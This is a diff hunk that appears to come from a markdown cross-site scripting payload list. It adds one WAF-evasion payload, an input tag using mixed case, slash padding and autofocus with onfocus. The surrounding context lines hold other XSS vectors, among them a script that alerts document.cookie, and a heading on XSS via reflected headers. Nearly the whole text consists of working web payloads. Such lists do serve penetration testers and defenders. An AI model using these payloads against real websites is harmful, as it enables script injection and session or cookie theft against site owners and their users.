@@ -82,6 +82,7 @@ OnMoUsEoVeR=prompt(/hacked/)//
 %3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
 </a<script>alert(document.cookie</script>
 "><svg/onload=prompt(1)>
+"><iNput///type="password"////id="CF-bypaSS" name="query"////value=""///oNfocUs="alert('chux')" AutOfoCus="" />
 ```
 ## XSS via Reflected Headers
 ```http
